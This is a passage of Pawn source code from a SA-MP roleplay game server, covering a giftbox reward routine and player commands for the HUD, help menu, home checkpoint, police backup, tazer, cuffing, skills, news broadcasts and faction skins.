						||  PlayerInfo[playerid][pCarkey7] == 0 ||  PlayerInfo[playerid][pCarkey8] == 0 ||  PlayerInfo[playerid][pCarkey9] == 0 ||  PlayerInfo[playerid][pCarkey10] == 0
						||  PlayerInfo[playerid][pCarkey11] == 0 ||  PlayerInfo[playerid][pCarkey12] == 0 ||  PlayerInfo[playerid][pCarkey13] == 0
						||  PlayerInfo[playerid][pCarkey14] == 0 ||  PlayerInfo[playerid][pCarkey15] == 0)
						{
							new randmasina = 1 + random(4);
							if(randmasina == 1 || randmasina == 3)
							{
								InsertCar(playerid, 1, 91,1);
								format(string,sizeof(string),"(( Giftbox: %s He won a vehicle type Turismo giftbox! Congratulations! ))",sendername);
							}
							if(randmasina == 2 || randmasina == 4 || randmasina == 5)
							{
								new suma = 50 + random(100);
								format(string,sizeof(string),"(( Giftbox: %s won %s Points Premium giftbox! Congratulations! ))",sendername,FormatNumber(suma));
								PlayerInfo[playerid][pPremiumPoints] += suma;
								Update(playerid, pPremiumPointsx);
							}
						}
					}
					else
					{
						if(PlayerInfo[playerid][pPcarkey] == 0 ||  PlayerInfo[playerid][pmotokey] == 0 ||  PlayerInfo[playerid][pprcarkey] == 0 ||  PlayerInfo[playerid][pprcarkey2] == 0 ||  PlayerInfo[playerid][pPPluscarkey] == 0 ||  PlayerInfo[playerid][pPPluscarkey2] == 0
						||  PlayerInfo[playerid][pCarkey7] == 0 ||  PlayerInfo[playerid][pCarkey8] == 0 ||  PlayerInfo[playerid][pCarkey9] == 0 ||  PlayerInfo[playerid][pCarkey10] == 0)
						{
							new randmasina = 1 + random(4);
							if(randmasina == 1 || randmasina == 3)
							{
								InsertCar(playerid, 1, 93,1);
								format(string,sizeof(string),"(( Giftbox: %s He won a vehicle type in giftbox Bullet! Congratulations! ))",sendername);
							}
							if(randmasina == 2 || randmasina == 4 || randmasina == 5)
							{
								new suma = 50 + random(100);
								format(string,sizeof(string),"(( Giftbox: %s won %s Points Premium giftbox! Congratulations! ))",sendername,FormatNumber(suma));
								PlayerInfo[playerid][pPremiumPoints] += suma;
								Update(playerid, pPremiumPointsx);
							}
						}
					}
				}
				if(randgift == 27 || randgift == 26 || randgift == 29)
				{
					new suma = 250000 + random(500000);
                    format(string,sizeof(string),"(( Giftbox: %s won $%s in giftbox! Congratulations! ))",sendername,FormatNumber(suma));
					GivePlayerCash(playerid, suma);
					Update(playerid, pCashx);
				}
				if(randgift == 28 || randgift == 25 || randgift == 24)
				{
					new suma = 250000 + random(400000);
                    format(string,sizeof(string),"(( Giftbox: %s a castigat $%s din giftbox! Felicitari! ))",sendername,FormatNumber(suma));
					GivePlayerCash(playerid, suma);
					Update(playerid, pCashx);
				}
				if(randgift == 30)
				{
					new suma = 20 + random(40);
					format(string,sizeof(string),"(( Giftbox: %s won %s Points Premium giftbox! Congratulations! ))",sendername,FormatNumber(suma));
					PlayerInfo[playerid][pPremiumPoints] += suma;
					Update(playerid, pPremiumPointsx);
				}
      			if(randgift == 1 || randgift == 8  || randgift == 14 || randgift == 15 || randgift == 18 || randgift == 19 || randgift == 20)
      			{
					new suma = 150000 + random(300000);
                    format(string,sizeof(string),"(( Giftbox: %s won $%s in giftbox! Congratulations! ))",sendername,FormatNumber(suma));
					GivePlayerCash(playerid, suma);
					Update(playerid, pCashx);
				}
      			if(randgift == 2 || randgift == 10 || randgift == 7)
      			{
      			    new suma = 150000 + random(550000);
                    format(string,sizeof(string),"(( Giftbox: %s won $%s in giftbox! Congratulations! ))",sendername,FormatNumber(suma));
                    GivePlayerCash(playerid, suma);
					Update(playerid, pCashx);
				}
      			if(randgift == 3 || randgift == 6)
      			{
                    new suma = 10 + random(25);
                    format(string,sizeof(string),"(( Giftbox: %s a won %s Points Premium giftbox! Congratulations! ))",sendername,FormatNumber(suma));
                    PlayerInfo[playerid][pPremiumPoints] += suma;
					Update(playerid, pPremiumPointsx);
			  	}
      			if(randgift == 4 || randgift == 5)
      			{
      			    new suma = 5 + random(10);
                    format(string,sizeof(string),"(( Giftbox: %s won %s Points Premium giftbox! Congratulations! ))",sendername,FormatNumber(suma));
                    PlayerInfo[playerid][pPremiumPoints] += suma;
					Update(playerid, pPremiumPointsx);
			  	}
      			if(randgift == 9 || randgift == 11 || randgift == 13)
      			{
      			    new suma = 5 + random(5);
                    format(string,sizeof(string),"(( Giftbox: %s won %s Points Premium giftbox! Congratulations! ))",sendername,FormatNumber(suma));
                    PlayerInfo[playerid][pExp] += suma;
					Update(playerid, pRP);
			  	}
      			if(randgift == 12)
      			{
      			    new suma = 5 + random(3);
                    format(string,sizeof(string),"(( Giftbox: %s won %s Respect points in giftbox! Congratulations! ))",sendername,FormatNumber(suma));
                    PlayerInfo[playerid][pExp] += suma;
					Update(playerid, pRP);
			  	}
      			if(randgift == 16 || randgift == 17)
      			{
      			    new suma = 15 + random(18);
                    format(string,sizeof(string),"(( Giftbox: %s won %s Points Premium giftbox! Congratulations! ))",sendername,FormatNumber(suma));
                    PlayerInfo[playerid][pPremiumPoints] += suma;
					Update(playerid, pPremiumPointsx);
				}
				new y,m,d,h,mi,s;
    			getdate(y,m,d);
    			gettime(h,mi,s);
				PlayerInfo[playerid][pGiftTime] += 5;
				SendClientMessageToAll(COLOR_GENANNOUNCE,string);
				Update(playerid, pGiftTimex);
				/*mysql_format(SQL, string, sizeof(string), "INSERT INTO giftbox_logs (`text`,`PlayerID`,`time`) VALUES ('%s','%d','%02d/%02d/%d %02d:%02d:%02d')", string, PlayerInfo[playerid][pSQLID],d,m,y,h,mi,s);
				mysql_tquery(SQL,string,"","");*/
				ShowPlayerDialog(playerid, DIALOG_GIFTBOX, DIALOG_STYLE_MSGBOX, "GiftBox", string, "OK", "");
			}
			else
			{
			    SendClientMessage(playerid, COLOR_SERVER, "You're near giftbox.");
			    SendClientMessage(playerid, COLOR_YELLOW, "Go to checkpoints on the minimap to reach giftbox!");
			    SetPlayerCheckpoint(playerid,GiftPosX,GiftPosY,GiftPosZ,5.0);
			    CP[playerid] = 1;
			    return 1;
			}
		}
		else return SendClientMessage(playerid, COLOR_SERVER, "The giftbox is not active.");
	}
	return 1;
}
CMD:hud(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(PlayerInfo[playerid][pLevel] < 5) return SendClientMessage(playerid, COLOR_SERVER, "You don't have level 5.");
    if(IsPlayerConnected(playerid))
    {
        new string[256],stringhp[64],stringarm[64],stringfps[64];
        if(PlayerInfo[playerid][pHUD1] != 0)
        {
            if(PlayerInfo[playerid][pHUD1] == 1)
            {
        		format(stringhp,sizeof(stringhp),"{C0C0C0}Grey");
			}
			else if(PlayerInfo[playerid][pHUD1] == 2)
			{
			    format(stringhp,sizeof(stringhp),"{FF0000}Red");
			}
			else if(PlayerInfo[playerid][pHUD1] == 3)
			{
			    format(stringhp,sizeof(stringhp),"{00FF00}Green");
			}
			else if(PlayerInfo[playerid][pHUD1] == 4)
			{
			    format(stringhp,sizeof(stringhp),"{0000FF}Blue");
			}
			else if(PlayerInfo[playerid][pHUD1] == 5)
			{
			    format(stringhp,sizeof(stringhp),"{FFFF00}Yellow");
			}
		}
		else
		{
		    format(stringhp,sizeof(stringhp),"{FF0000}Disabled");
		}
		if(PlayerInfo[playerid][pHUD2] != 0)
        {
            if(PlayerInfo[playerid][pHUD2] == 1)
            {
        		format(stringarm,sizeof(stringarm),"{C0C0C0}Grey");
			}
			else if(PlayerInfo[playerid][pHUD2] == 2)
			{
			    format(stringarm,sizeof(stringarm),"{FF0000}Red");
			}
			else if(PlayerInfo[playerid][pHUD2] == 3)
			{
			    format(stringarm,sizeof(stringarm),"{00FF00}Green");
			}
			else if(PlayerInfo[playerid][pHUD2] == 4)
			{
			    format(stringarm,sizeof(stringarm),"{0000FF}Blue");
			}
			else if(PlayerInfo[playerid][pHUD2] == 5)
			{
			    format(stringarm,sizeof(stringarm),"{FFFF00}Yellow");
			}
		}
		else
		{
		    format(stringarm,sizeof(stringarm),"{FF0000}Disabled");
		}
		if(PlayerInfo[playerid][pHUD3] != 0)
		{
		    format(stringfps,sizeof(stringfps),"{FFFF00}Enabled");
		}
		else
		{
		    format(stringfps,sizeof(stringfps),"{FF0000}Disabled");
		}
        format(string,sizeof(string),"HP Text: %s\n{FFFFFF}Armour Text: %s\n{FFFFFF}Display FPS: %s",stringhp,stringarm,stringfps);
        ShowPlayerDialog(playerid,DIALOG_HUD,DIALOG_STYLE_LIST, "HUD Options", string, "Select","Close");
	}
	return 1;
}
CMD:help(playerid,params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
        ShowPlayerDialog(playerid,DIALOG_HELP,DIALOG_STYLE_LIST, "SERVER: Commands", "General\nChat\nGroups\nAnimations\nHouses\nJobs\nBusinesses\nHelpers\nVehicles\nBank\nRob\nVIP Houses", "Select","Exit");
	}
	return 1;
}
CMD:home(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		new idcasa;
		if(sscanf(params, "i", idcasa)) return SCM(playerid, -1, "/home [1 - house / 2 - vip house]");
		if(idcasa == 1)
		{
			if(PlayerInfo[playerid][pPhousekey] != 999)
			{
				if(CP[playerid] < 1 && IsCollectingRubbish[playerid] < 1 && !IsATruck(GetPlayerVehicleID(playerid)) && MechanicCallTime[playerid] < 1 && CheckBus[playerid] < 1 && GotoMats[playerid] < 1 && CarJacker[playerid] < 1 && JCurier[playerid][0] < 1)
				{
					new h;
					h = PlayerInfo[playerid][pPhousekey];
					SetPlayerCheckpoint(playerid, HouseInfo[h][hEntrancex], HouseInfo[h][hEntrancey], HouseInfo[h][hEntrancez], 5.0);
					CP[playerid] = 43;
					SendClientMessage(playerid, COLOR_SERVER, "A checkpoint has been set to your house.");
				}
				else
				{
					ShowPlayerDialog(playerid, DIALOG_JOBULETES, DIALOG_STYLE_MSGBOX, "Cancel Checkpoint", "Are you sure you want to cancel the current checkpoint?", "Yes", "No");

				}
			}
			else return SCM(playerid, COLOR_SERVER, "You don't have a house.");
		}
		if(idcasa == 2)
		{
			if(PlayerInfo[playerid][pPhousekey2] != 999)
			{
				if(CP[playerid] < 1 && IsCollectingRubbish[playerid] < 1 && !IsATruck(GetPlayerVehicleID(playerid)) && MechanicCallTime[playerid] < 1 && CheckBus[playerid] < 1 && GotoMats[playerid] < 1 && CarJacker[playerid] < 1 && JCurier[playerid][0] < 1)
				{
					new h;
					h = PlayerInfo[playerid][pPhousekey2];
					SetPlayerCheckpoint(playerid, HouseInfo[h][hEntrancex], HouseInfo[h][hEntrancey], HouseInfo[h][hEntrancez], 5.0);
					CP[playerid] = 43;
					SendClientMessage(playerid, COLOR_SERVER, "A checkpoint has been set to your vip house.");
				}
				else
				{
					ShowPlayerDialog(playerid, DIALOG_JOBULETES, DIALOG_STYLE_MSGBOX, "Cancel Checkpoint", "Are you sure you want to cancel the current checkpoint?", "Yes", "No");

				}
			}
			else return SCM(playerid, COLOR_ERROR, "Nu detii o casa VIP.");
		}		
	}
	return 1;
}
CMD:backup(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		if(IsACop(playerid))
 		{
            if(OnDuty[playerid] != 1) return SendClientMessage(playerid,COLOR_SERVER, "{FFB870}You are not on Duty.");
			if (PlayerInfo[playerid][pRequestingBackup] != 1)
			{
				new string[128],sendername[25];
				GetPlayerName(playerid, sendername, sizeof(sendername));
				format(string, sizeof(string), "ALL UNITS: %s is requesting immediate assistance, they have been marked on the map (red).", sendername);
				PlayerInfo[playerid][pRequestingBackup] = 1;
				new Float:x, Float:y, Float:z;
				GetPlayerPos(playerid,x,y,z);
				for(new i = 0; i < MAX_PLAYERS; i++)
				{
					if(IsPlayerConnected(i))
					{
						if(IsACop(i))
						{
							CP[i] = 0;
							CP[i] = 43;
							SetPlayerCheckpoint(i,x,y,z,5.0);
							SendClientMessage(i, TEAM_BLUE_COLOR, string);
						}
					}
				}
				SendClientMessage(playerid, TEAM_BLUE_COLOR, "Type /backupclear to clear your backup request.");
			}
			else
			{
				SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You already have an active backup request.");
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are not a Cop.");
		}
	}
	return 1;
}
CMD:backupclear(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		if(IsACop(playerid))
 		{
        	BackupClear(playerid, 0);
		}
		else
		{
			SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are not a Cop.");
		}
	}
	return 1;
}
CMD:stopanim(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "You can't use this command in a vehicle.");
        ClearAnimations(playerid);
        PlayerHandsup[playerid] = 0;
    }
    return 1;
}
CMD:tazer(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		if(IsACop(playerid))
		{
			if(OnDuty[playerid] != 1) return SendClientMessage(playerid, COLOR_SERVER, "{3385FF}You are not on Duty.");
			if(GetPlayerWeapon(playerid) != 24) return SCM(playerid,COLOR_SERVER,"{FFB870}You don't have desert deagle in your hand.");
		    new x_nr[10];
	        if(sscanf(params, "s[10]",x_nr)) return SCM(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/tazer <On-Off>");
	        if(strcmp(x_nr,"on",true) == 0)
       		{
       			if(tazer[playerid] == 1) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You tazer gun is already enable.");
       		    tazer[playerid] = 1;
				SendClientMessage(playerid, COLOR_SERVER, "You enable tazer gun.");
				return 1;
       		}
	        if(strcmp(x_nr,"off",true) == 0)
       		{
       			if(tazer[playerid] == 0) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You tazer gun is already disable.");
		   	    tazer[playerid] = 0;
       		    SendClientMessage(playerid, COLOR_SERVER, "You disable tazer gun.");
       		    return 1;
       		}
	    }
		else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are not a Cop.");
	}
	return 1;
}
CMD:cuff(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		if(IsACop(playerid))
		{
			new giveplayerid,string[256],sendername[25],giveplayer[25];
			if(sscanf(params, "u",giveplayerid)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/cuff <Name/Playerid>");
		    if(IsPlayerConnected(giveplayerid))
			{
			    if(giveplayerid != INVALID_PLAYER_ID)
			    {
			        if(IsACop(giveplayerid)) return SendClientMessage(playerid,COLOR_SERVER, "{FFB870}You can't Cuff cops.");
			        if(PlayerHandsup[giveplayerid] < 1 && !IsPlayerInAnyVehicle(giveplayerid)) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You can't cuff a player who don't have hands up.");
				    if(PlayerCuffed2[giveplayerid] > 0) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Player already cuffed.");
					if (ProxDetectorS(8.0, playerid, giveplayerid))
					{
					    if(giveplayerid == playerid) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You cannot cuff yourself.");
						if(IsPlayerInAnyVehicle(giveplayerid))
						{
							TogglePlayerControllable(giveplayerid, 0);
						}
					    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
					    format(string, sizeof(string), "* You were Cuffed by %s, till uncuff.", sendername);
						SendClientMessage(giveplayerid, COLOR_SERVER, string);
						format(string, sizeof(string), "* You Cuffed %s, till uncuff.", giveplayer);
						SendClientMessage(playerid, COLOR_SERVER, string);
						format(string, sizeof(string), "* %s Hand Cuffs %s, so he wont go anywhere.", sendername ,giveplayer);
						ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						GameTextForPlayer(giveplayerid, "~r~~h~Cuffed", 2500, 3);
						PlayerCuffed2[giveplayerid] = 1;
						SetPlayerAttachedObject(giveplayerid, 1, 19418, 6, -0.011000, 0.028000, -0.022000, -15.600012, -33.699977, -81.700035, 0.891999, 1.000000, 1.168000);
                        SetPlayerSpecialAction(giveplayerid,SPECIAL_ACTION_CUFFED);
					}
					else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}This player is not near you.");
				}
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
		}
		else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are not a Cop.");
	}
	return 1;
}
CMD:uncuff(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		if(IsACop(playerid))
		{
			new giveplayerid,giveplayer[25],sendername[25],string[128];
			if(sscanf(params, "u",giveplayerid)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/uncuff <Name/Playerid>");
			{
				if(IsPlayerConnected(giveplayerid))
				{
					if(giveplayerid != INVALID_PLAYER_ID)
					{
					    if (ProxDetectorS(8.0, playerid, giveplayerid))
						{
						    if(giveplayerid == playerid) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You cannot Uncuff yourself.");
							if(PlayerCuffed2[giveplayerid] == 1)
							{
								if(IsPlayerInAnyVehicle(giveplayerid))
								{
									TogglePlayerControllable(giveplayerid, 1);
								}
							    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
								GetPlayerName(playerid, sendername, sizeof(sendername));
							    format(string, sizeof(string), "* You were Uncuffed by %s.", sendername);
								SendClientMessage(giveplayerid, COLOR_SERVER, string);
								format(string, sizeof(string), "* You Uncuffed %s.", giveplayer);
								SendClientMessage(playerid, COLOR_SERVER, string);
								GameTextForPlayer(giveplayerid, "~g~Uncuffed", 2500, 3);
					     		PlayerCuffed2[giveplayerid] = 0;
						    	SetPlayerSpecialAction(giveplayerid,SPECIAL_ACTION_NONE);
						    	RemovePlayerAttachedObject(giveplayerid,1);
							}
							else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}That player isn't Tied up.");
						}
						else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}This player is not near you.");
					}
					else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
				}
			}
		}
		else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are not a Cop.");
	}
	return 1;
}
CMD:skill(playerid,params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
        new string[MAX_STRING];
        SendClientMessage(playerid, COLOR_SERVER, "---- Skills: ----");
        if(PlayerInfo[playerid][pRobSkill] < 6)
        {
        	format(string,sizeof(string),"Rob skill: %d/6 (%d robs) | Needed for next skill level: %d",PlayerInfo[playerid][pRobSkill], PlayerInfo[playerid][pRobTimes], PlayerInfo[playerid][pRobRem]);
		}
		else if(PlayerInfo[playerid][pRobSkill] >= 6)
		{
        	format(string,sizeof(string),"Rob skill: %d/6 (%d robs)",PlayerInfo[playerid][pRobSkill], PlayerInfo[playerid][pRobTimes]);
		}
        SendClientMessage(playerid, COLOR_SERVER, string);
        if(PlayerInfo[playerid][pTruckSkill] < 6)
        {
        	format(string,sizeof(string),"Trucker skill: %d/6 (%d trailers delivered) | Needed for next skill level: %d",PlayerInfo[playerid][pTruckSkill], PlayerInfo[playerid][pTruckTimes], PlayerInfo[playerid][pTruckRem]);
		}
		else if(PlayerInfo[playerid][pTruckSkill] >= 6)
		{
        	format(string,sizeof(string),"Trucker skill: %d/6 (%d trailers delivered)",PlayerInfo[playerid][pTruckSkill], PlayerInfo[playerid][pTruckTimes]);
		}
        SendClientMessage(playerid, COLOR_SERVER, string);
        if(PlayerInfo[playerid][pFarmSkill] < 6)
        {
        	format(string,sizeof(string),"Farmer skill: %d/6 (%d bags of flour sold) | Needed for next skill level: %d",PlayerInfo[playerid][pFarmSkill], PlayerInfo[playerid][pFarmTimes], PlayerInfo[playerid][pFarmRem]);
		}
		else if(PlayerInfo[playerid][pFarmSkill] >= 6)
		{
        	format(string,sizeof(string),"Farmer skill: %d/6 (%d bags of flour sold)",PlayerInfo[playerid][pFarmSkill], PlayerInfo[playerid][pFarmTimes]);
		}
        SendClientMessage(playerid, COLOR_SERVER, string);
        if(PlayerInfo[playerid][pFishSkill] < 6)
        {
        	format(string,sizeof(string),"Fisherman skill: %d/6 (%d fish caught) | Needed for next skill level: %d",PlayerInfo[playerid][pFishSkill], PlayerInfo[playerid][pFishTimes], PlayerInfo[playerid][pFishRem]);
		}
		else if(PlayerInfo[playerid][pFishSkill] >= 6)
		{
        	format(string,sizeof(string),"Fisherman skill: %d/6 (%d fish caught)",PlayerInfo[playerid][pFishSkill], PlayerInfo[playerid][pFishTimes]);
		}
        SendClientMessage(playerid, COLOR_SERVER, string);
		if(PlayerInfo[playerid][pArmsSkill] < 6)
        {
        	format(string,sizeof(string),"Arms dealer skill: %d/6 (delivered materials %d times) | Needed for next skill level: %d",PlayerInfo[playerid][pArmsSkill], PlayerInfo[playerid][pArmsTimes], PlayerInfo[playerid][pArmsRem]);
		}
		else if(PlayerInfo[playerid][pArmsSkill] >= 6)
		{
        	format(string,sizeof(string),"Arms dealer skill: %d/6 (delivered materials %d times)",PlayerInfo[playerid][pArmsSkill], PlayerInfo[playerid][pArmsTimes]);
		}
        SendClientMessage(playerid, COLOR_SERVER, string);
		if(PlayerInfo[playerid][pPizzaSkill] < 6)
        {
        	format(string,sizeof(string),"Pizza Boy skill: %d/6 (delivered %d pizzas) | Needed for next skill level: %d",PlayerInfo[playerid][pPizzaSkill], PlayerInfo[playerid][pPizzaTimes], PlayerInfo[playerid][pPizzaRem]);
		}
		else if(PlayerInfo[playerid][pPizzaSkill] >= 6)
		{
        	format(string,sizeof(string),"Pizza Boy skill: %d/6 (delivered %d pizzas)",PlayerInfo[playerid][pPizzaSkill], PlayerInfo[playerid][pPizzaTimes]);
		}
        SendClientMessage(playerid, COLOR_SERVER, string);
		if(PlayerInfo[playerid][pBusSkill] < 6)
        {
        	format(string,sizeof(string),"Bus Driver skill: %d/6 (%d shifts completed) | Needed for next skill level: %d",PlayerInfo[playerid][pBusSkill], PlayerInfo[playerid][pBusTimes], PlayerInfo[playerid][pBusRem]);
		}
		else if(PlayerInfo[playerid][pBusSkill] >= 6)
		{
        	format(string,sizeof(string),"Bus Driver skill: %d/6 (%d shifts completed)",PlayerInfo[playerid][pBusSkill], PlayerInfo[playerid][pBusTimes]);
		}
        SendClientMessage(playerid, COLOR_SERVER, string);
		if(PlayerInfo[playerid][pCurierSkill] < 6)
        {
        	format(string,sizeof(string),"Curier skill: %d/6 (delivered %d packages) | Needed for next skill level: %d",PlayerInfo[playerid][pCurierSkill], PlayerInfo[playerid][pCurierTimes], PlayerInfo[playerid][pCurierRem]);
		}
		else if(PlayerInfo[playerid][pCurierSkill] >= 6)
		{
        	format(string,sizeof(string),"Curier skill: %d/6 (delivered %d packages)",PlayerInfo[playerid][pCurierSkill], PlayerInfo[playerid][pCurierTimes]);
		}
        SendClientMessage(playerid, COLOR_SERVER, string);
		if(PlayerInfo[playerid][pCimentSkill] < 6)
        {
        	format(string,sizeof(string),"Transportator de Ciment skill: %d/6 (delivered %d transports) | Needed for next skill level: %d",PlayerInfo[playerid][pCimentSkill], PlayerInfo[playerid][pCimentTimes], PlayerInfo[playerid][pCimentRem]);
		}
		else if(PlayerInfo[playerid][pCimentSkill] >= 6)
		{
        	format(string,sizeof(string),"Transportator de Ciment skill: %d/6 (delivered %d transports)",PlayerInfo[playerid][pCimentSkill], PlayerInfo[playerid][pCimentTimes]);
		}
        SendClientMessage(playerid, COLOR_SERVER, string);
		if(PlayerInfo[playerid][pCarieraSkill] < 6)
        {
        	format(string,sizeof(string),"Muncitor in Cariera skill: %d/6 (%d finishes completed) | Needed for next skill level: %d",PlayerInfo[playerid][pCarieraSkill], PlayerInfo[playerid][pCarieraTimes], PlayerInfo[playerid][pCarieraRem]);
		}
		else if(PlayerInfo[playerid][pCarieraSkill] >= 6)
		{
        	format(string,sizeof(string),"Muncitor in Cariera skill: %d/6 (%d finishes completed)",PlayerInfo[playerid][pCarieraSkill], PlayerInfo[playerid][pCarieraTimes]);
		}
        SendClientMessage(playerid, COLOR_SERVER, string);
	}
	return 1;
}
CMD:skills(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	return cmd_skill(playerid, params);
}
CMD:news(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		if(PlayerInfo[playerid][pMember] == 9 || PlayerInfo[playerid][pLeader] == 9)
		{
		    new newcar = GetPlayerVehicleID(playerid);
		    new string[256],sendername[25];
	        if(PlayerInfo[playerid][pMuted] == 1)
            {
				format(string, sizeof(string), "You can not speak, you have been silenced for %d seconds.",PlayerInfo[playerid][pMuteTime]);
				SendClientMessage(playerid, COLOR_ERROR, string);
				return 1;
		    }
		    new result[250];
		    if(sscanf(params, "s[250]",result)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/news <Message>");
		    if(FindIP(result)) /// Anti-Reclama
	        {
		        new advertiser[MAX_PLAYER_NAME];
		        GetPlayerName(playerid, advertiser, sizeof(advertiser));
		        format(string, sizeof(string), "{ba9789}Warning: %s(%d) typed %s in /news.", advertiser, playerid, result);
				ABroadCast(COLOR_SERVER,string,1);
	        }
	        for(new i; i < sizeof(TLD); i++)
			{
				if(strfind(result, TLD[i], true) != -1)
				{
					if(strfind(result, "wwww.Magic-Gaming.tk", true) != -1 || strfind(result, "wwww.Magic-Gaming.tk/forum", true) != -1 || strfind(result, "Magic-Gaming.tk", true) != -1) break;
					new advertiser[MAX_PLAYER_NAME];
					GetPlayerName(playerid, advertiser, sizeof(advertiser));
					format(string, sizeof(string), "{ba9789}Warning: %s(%d) typed %s in /news.", advertiser, playerid, result);
					ABroadCast(COLOR_SERVER,string,1);
				}
			}
			if(newcar == news[1] || newcar == news[2] || newcar == news[3] || newcar == news[4] || newcar == news[5] || newcar == news[6] || newcar == news[7] || newcar == news[8] || newcar == news[9] || newcar == news[10]
			|| newcar == news[11] || newcar == news[12] || newcar == news[13] || newcar == news[14] || newcar == news[15] || newcar == news[16] || newcar == news[17])
			{
				GetPlayerName(playerid, sendername, sizeof(sendername));
				format(string, sizeof(string), "NR %s: %s", sendername, result);
				OOCNews(COLOR_ORANGE,string);
				PlayerInfo[playerid][pNews] += 1;
				Update(playerid,pNewsx);
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are not in the News Van or Chopper.");
		}
		else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are not a News Reporter.");
	}
	return 1;
}
CMD:fskin(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pMember] < 1) return SCM(playerid, COLOR_ERROR, "Shoma Dar Faction Nistid!");
	new skinales;
	if(PlayerInfo[playerid][pMember] == 1) { skinales = 71; SetPlayerSkin(playerid, 71); }
	else if(PlayerInfo[playerid][pMember] == 2) {  skinales = 163; SetPlayerSkin(playerid, 163); }
	else if(PlayerInfo[playerid][pMember] == 3) {  skinales = 287; SetPlayerSkin(playerid, 287); }
	else if(PlayerInfo[playerid][pMember] == 4) { skinales = 116; SetPlayerSkin(playerid, 116); }
	else if(PlayerInfo[playerid][pMember] == 5) { skinales = 106; SetPlayerSkin(playerid, 106); }
	else if(PlayerInfo[playerid][pMember] == 6) { skinales = 176; SetPlayerSkin(playerid, 176); }
	else if(PlayerInfo[playerid][pMember] == 8) { skinales = 71; SetPlayerSkin(playerid, 71); }
	else if(PlayerInfo[playerid][pMember] == 9) { skinales = 17; SetPlayerSkin(playerid, 17); }
	else if(PlayerInfo[playerid][pMember] == 10) { skinales = 104; SetPlayerSkin(playerid, 104); }
	else if(PlayerInfo[playerid][pMember] == 11) { skinales = 208; SetPlayerSkin(playerid, 208); }
	else if(PlayerInfo[playerid][pMember] == 12) { skinales = 153; SetPlayerSkin(playerid, 153); }
	else if(PlayerInfo[playerid][pMember] == 13) { skinales = 253; SetPlayerSkin(playerid, 253); }
	else if(PlayerInfo[playerid][pMember] == 14) { skinales = 274; SetPlayerSkin(playerid, 274); }
    else if(PlayerInfo[playerid][pMember] == 15) { skinales = 71; SetPlayerSkin(playerid, 71); }
	PlayerInfo[playerid][pModel] = skinales;
	SCM(playerid, -1, "Skin Faction Set Shod!");
	new string[1000];
	mysql_format(SQL, string, sizeof(string), "UPDATE users SET `Model`='%d' WHERE ID='%d'", PlayerInfo[playerid][pModel], PlayerInfo[playerid][pSQLID]);
    mysql_tquery(SQL, string,"","");
	return 1;
}
CMD:clothes(playerid, params[])
{
